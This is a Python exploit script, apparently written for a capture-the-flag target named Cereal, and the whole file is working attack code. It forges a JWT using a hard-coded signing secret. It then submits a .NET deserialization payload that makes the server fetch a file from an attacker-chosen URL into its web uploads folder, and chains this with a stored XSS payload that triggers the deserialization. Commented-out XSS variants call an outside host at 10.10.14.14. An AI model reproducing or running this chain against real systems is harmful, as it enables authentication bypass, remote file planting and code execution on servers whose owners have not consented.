#!/usr/bin/env python3

import jwt
import requests
import sys
from datetime import datetime, timedelta
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


# Get args
try:
    target = sys.argv[1]
    url = sys.argv[2]
    saveas = sys.argv[3]
except IndexError:
    print(f'Usage: {sys.argv[0]} [target ip/domain] [url to upload] [filename on target]')
    sys.exit()


# Forge JWT
print('[*] Forging JWT token')
token = jwt.encode({'name': "1", "exp": datetime.utcnow() + timedelta(days=7)}, 'secretlhfIH&FY*#oysuflkhskjfhefesf', algorithm="HS256")
headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}

# Send DownloadHelper object as JSON
print('[*] Sending DownloadHelper serialized object')
serial_payload = {"json": "{'$type':'Cereal.DownloadHelper, Cereal','URL':'" + url + "','FilePath': 'C:\\\\inetpub\\\\source\\\\uploads\\\\" + saveas + "'}"} 
resp = requests.post(f'https://{target}/requests', json=serial_payload, headers=headers, verify=False)
if resp.status_code != 200:
    print(f'[-] Something went wrong: {resp.text}')
    sys.exit()
serial_id = resp.json()['id']
print(f'[+] Object uploaded: {resp.text}')

# Send XSS payload
print('[*] Sending XSS payload')
#xss_payload = {"json":'{"title":"[XSS](javascript: document.write%28%27<img src=%22http://10.10.14.14/onelasttest.png%22 />%27%29)","flavor":"sushi","color":"#FFF","description":"asd"}'}
#xss_payload = {"json":"{\"title\":\"[XSS](javascript: document.write%28%22<script>window.location = 'http://10.10.14.14/location2';</script>%22%29)\",\"flavor\":\"bacon\",\"color\":\"#FFF\",\"description\":\"\"}"}
xss_payload = {"json":"{\"title\":\"[XSS](javascript: document.write%28%22<script>var xhr = new XMLHttpRequest;xhr.open%28'GET', 'https://"+ target + "/requests/" + str(serial_id)+"', true%29;xhr.setRequestHeader%28'Authorization','Bearer "+token+"'%29;xhr.send%28null%29</script>%22%29)\",\"flavor\":\"pizza\",\"color\":\"#FFF\",\"description\":\"test\"}"}
resp = requests.post(f'https://{target}/requests', json=xss_payload, headers=headers, verify=False)
if resp.status_code != 200:
    print('[-] Something went wrong: {resp.text}')
    sys.exit()
print(f'[+] XSS payload sent: {resp.text}')
